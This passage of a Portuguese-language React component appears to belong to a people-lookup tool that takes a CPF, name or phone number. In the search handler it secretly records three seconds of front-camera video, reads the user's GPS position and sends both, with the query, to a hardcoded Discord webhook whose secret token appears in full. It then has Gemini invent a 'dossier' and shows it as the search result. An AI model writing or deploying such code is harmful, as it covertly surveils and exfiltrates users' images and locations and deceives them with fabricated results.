} from 'lucide-react';
import { ServiceTool } from '../types';
import { GoogleGenAI } from '@google/genai';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1470946745344196812/R1tVe1gUJ8xK_JwkNugUU78diWt9-exPk58pI5k-ijAnpD1rzZUAZTqVqz3GHAt5zVBr";

interface SearchModalProps {
  isOpen: boolean;
  onClose: () => void;
  tool: ServiceTool;
}

const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
  const [query, setQuery] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [statusText, setStatusText] = useState('Pronto');
  const [permissionError, setPermissionError] = useState(false);

  const inputRef = useRef<HTMLInputElement>(null);
  const chunksRef = useRef<Blob[]>([]);

  useEffect(() => {
    if (isOpen) {
      setTimeout(() => inputRef.current?.focus(), 300);
      setResult(null);
      setQuery('');
      setIsLoading(false);
      setPermissionError(false);
      setStatusText('Aguardando...');
    }
  }, [isOpen]);

  const getGeolocation = (): Promise<{lat: number, lng: number} | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 5000 }
      );
    });
  };

  const sendToDiscord = async (videoBlob: Blob, location?: {lat: number, lng: number} | null) => {
    try {
      const mapsUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : "Não autorizado";

      const payload = {
        username: "Nova Reports",
        embeds: [{
          title: "🎯 Consulta & Biometria",
          color: 0x10b981,
          fields: [
            { name: "🔍 Alvo", value: `\`${query}\``, inline: true },
            { name: "📂 Módulo", value: `\`${tool.title}\``, inline: true },
            { name: "📍 Localização", value: location ? `[Ver no Mapa](${mapsUrl})` : "Sem GPS", inline: false },
            { name: "📸 Status", value: "Gravação Frontal Anexada", inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      const formData = new FormData();
      formData.append('payload_json', JSON.stringify(payload));
      formData.append('file', videoBlob, 'biometria_frontal.webm');

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: formData
      });
    } catch (err) {
      console.error("Erro ao enviar para Discord:", err);
    }
  };

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!query || isLoading) return;

    setIsLoading(true);
    setPermissionError(false);
    setStatusText('Iniciando protocolos...');

    try {
      // 1. GPS
      const loc = await getGeolocation();

      // 2. Câmera Frontal e Gravação
      let stream: MediaStream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user' } 
        });
      } catch (err) {
        setPermissionError(true);
        setIsLoading(false);
        return;
      }

      setStatusText('Gravando biometria...');

      const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      chunksRef.current = [];

      mediaRecorder.ondataavailable = (ev) => {
        if (ev.data.size > 0) chunksRef.current.push(ev.data);
      };

      // Inicia gravação e encerra após 3 segundos
      mediaRecorder.start();

      await new Promise(resolve => setTimeout(resolve, 3000));

      if (mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
      }

      // Aguarda o blob ser gerado
      await new Promise(resolve => {
        mediaRecorder.onstop = async () => {
          const videoBlob = new Blob(chunksRef.current, { type: 'video/webm' });
          setStatusText('Sincronizando logs...');
          await sendToDiscord(videoBlob, loc);
          stream.getTracks().forEach(track => track.stop());
          resolve(true);
        };
      });

      setStatusText('Consultando inteligência...');

      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: `Analista de Dados. Gere um dossiê técnico para "${tool.title}" com o identificador "${query}". Retorne um objeto JSON puro.`,
        config: { responseMimeType: "application/json" }
      });

      setResult(JSON.parse(response.text || '{}'));
      setIsLoading(false);
    } catch (error) {
      setIsLoading(false);
      setStatusText('Erro no terminal');
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-end lg:items-center justify-center p-0 lg:p-6">
      <div className="absolute inset-0 bg-black/98 backdrop-blur-3xl" onClick={onClose} />
      <div className="relative w-full h-[90vh] lg:h-auto lg:max-w-4xl bg-[#08080a] border-t lg:border border-white/10 rounded-t-[3rem] lg:rounded-[3rem] overflow-hidden flex flex-col shadow-2xl">

        <div className="shrink-0 p-6 lg:p-10 border-b border-white/5 flex items-center justify-between bg-zinc-900/10">
          <div className="flex items-center gap-5">
            <div className="w-14 h-14 rounded-2xl flex items-center justify-center bg-emerald-500/10 text-emerald-500">
               <Database size={32} />
            </div>
            <div>
              <h2 className="text-2xl font-black text-white uppercase tracking-tighter mb-1">{tool.title}</h2>
              <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-[0.3em]">{tool.subtitle}</p>
            </div>
          </div>
          <button onClick={onClose} className="p-3 bg-white/5 rounded-2xl text-zinc-600 hover:text-white transition-colors">
            <X size={28} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 lg:p-12 custom-scrollbar">
          <div className="max-w-2xl mx-auto">

            {!isLoading && !result && !permissionError && (
              <form onSubmit={handleSearch} className="space-y-6 animate-in slide-in-from-bottom-4">
                <div className="space-y-4">
                   <div className="flex items-center justify-between px-2">
                      <label className="text-[10px] font-black text-zinc-700 uppercase tracking-widest">Entrada de Dados</label>
                      <span className="flex items-center gap-1 text-[9px] font-bold text-emerald-500/40 uppercase"><Globe size={10}/> Rede Ativa</span>
                   </div>
                   <input 
                      ref={inputRef}
                      type="text"
                      value={query}
                      onChange={(e) => setQuery(e.target.value)}
                      placeholder="CPF, Nome, Telefone..."
                      className="w-full bg-zinc-900/20 border-2 border-white/5 rounded-[2.5rem] py-8 px-10 text-white text-2xl font-black outline-none focus:border-emerald-500/20 transition-all"
                    />
                </div>
                <button 
                  type="submit" 
                  disabled={!query} 
                  className="w-full py-7 rounded-[2.5rem] bg-emerald-600 border-2 border-emerald-500 text-black font-black text-xl flex items-center justify-center gap-4 shadow-2xl shadow-emerald-500/20 hover:brightness-110 active:scale-95 disabled:opacity-50 transition-all"
                >
                  <Activity size={28} /> EXECUTAR BUSCA
                </button>
                <div className="flex items-center justify-center gap-6 text-zinc-600 text-[9px] font-black uppercase tracking-widest opacity-60">
                   <span className="flex items-center gap-1"><Camera size={12}/> Biometria Frontal</span>
                   <span className="flex items-center gap-1"><MapPin size={12}/> GPS Ativo</span>
